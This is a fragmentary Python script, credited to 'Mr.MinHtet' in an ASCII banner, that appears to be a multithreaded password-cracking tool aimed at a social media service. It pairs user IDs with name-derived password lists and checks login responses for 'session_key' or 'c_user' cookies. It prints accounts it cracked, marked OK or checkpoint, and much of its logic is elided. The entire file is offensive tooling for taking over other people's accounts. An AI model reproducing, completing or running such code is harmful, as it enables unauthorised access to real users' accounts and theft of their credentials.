...
| |\/| | | |\/| | |  _  | __/ _ \ __|
| |  | | | |  | | | | | | ||  __/ |_ 
\_|  |_/ \_|  |_/ \_| |_/\__\___|\__|\033[1;32m    XD
\033[1;34m----------------------------------------------
 [~] Author   : Mr.MinHtet
...
def pak():
		...
		with tred(max_workers=30) as MMH:	
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					MMH.submit(MMH1,ids,passlist)
				if mthd in ['2','02']:
					MMH.submit(MMH2,ids,passlist)
				if mthd in ['3','03']:
					MMH.submit(MMH3,ids,passlist)
				if mthd in ['4','04']:
					MMH.submit(MMH4,ids,passlist)
				if mthd in ['5','05']:
					MMH.submit(MMH5,ids,passlist)
				if mthd in ['6','06']:
					MMH.submit(MMH6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;32m [MMH-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					if 'y' in pcp:
						print('\r\r\x1b[1;91m [MMH-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [MMH-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[1;91m [MMH-CP] '+uid+' | '+pas+'\033[1;92m')
